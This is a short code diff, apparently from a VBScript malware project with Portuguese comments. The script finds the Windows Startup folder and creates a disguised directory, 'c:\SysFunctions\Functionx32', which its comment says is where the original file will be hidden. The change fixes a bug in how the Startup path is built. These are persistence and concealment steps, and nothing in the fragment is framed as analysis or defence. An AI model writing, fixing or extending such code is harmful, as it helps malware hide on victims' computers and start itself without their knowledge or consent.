@@ -12,7 +12,7 @@ set exe = CreateObject("Shell.Application")
 
 ' Aqui o script busca encontrar o diretorio da pasta Startup(pasta onde fica os arquivos que iniciam junto do windows)
 set stpath = crt.SpecialFolders("Startup")
-crt.Replace(stpath,"Startup","Startup\")
+stpath = Replace(stpath,"Startup","Startup\")
 
 ' Cria o diretorio onde o arquivo original ficara escondido
 crt.Run "cmd /c mkdir c:\SysFunctions\Functionx32"
